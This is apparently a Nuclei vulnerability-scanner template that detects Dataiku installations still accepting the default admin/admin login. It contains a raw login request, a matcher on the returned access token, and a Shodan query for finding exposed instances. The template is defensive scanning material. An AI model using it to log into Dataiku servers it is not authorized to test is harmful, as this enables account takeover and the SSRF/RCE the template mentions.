id: dataiku-default-login

info:
  name: Dataiku Default Login
  author: random-robbie
  severity: critical
  description: Dataiku default login which allows SSRF/RCE etc.
  reference:
    - https://www.dataiku.com
  metadata:
    verified: true
    shodan-query: title:"dataiku"
  tags: default-login,dataiku

requests:
  - raw:
      - |-
        POST /dip/api/login HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:105.0) Gecko/20100101 Firefox/105.0
        Accept: application/json, text/plain, */*
        Content-Type: application/x-www-form-urlencoded;charset=utf-8
        Origin: {{BaseURL}}
        Referer: {{BaseURL}}/login/?redirectTo=~2F
        
        login=admin&password=admin

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - 'dss_access_token'

      - type: status
        status:
          - 200
